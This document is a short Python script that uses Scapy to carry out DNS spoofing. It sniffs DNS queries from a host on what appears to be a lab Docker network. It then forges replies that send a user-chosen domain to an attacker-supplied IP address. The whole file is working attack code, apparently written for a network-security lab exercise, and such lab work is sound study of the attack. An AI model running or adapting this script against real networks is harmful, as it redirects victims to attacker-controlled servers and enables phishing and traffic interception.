#!/usr/bin/env python3
from scapy.all import *

dom_name= input('enter the user website:')
ip_add= input('enter the ip address:')

def spoof_user_res(packet):
  if (DNS in packet and dom_name in packet[DNS].qd.qname.decode('utf-8')):
    packet.show()

    UDP_packet = UDP(dport=packet[UDP].sport, sport=53)

    Ans_sec = DNSRR(rrname=packet[DNS].qd.qname, rdata=ip_add)

    DNS_packet = DNS(id=packet[DNS].id,  
                 ancount=1, an=Ans_sec)

    response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP_packet/DNS_packet
    send(response)


f = 'udp and src host 10.9.0.5 and dst port 53'
packet = sniff(iface= 'br-e0ea12bfdd62', filter=f, prn=spoof_user_res)   
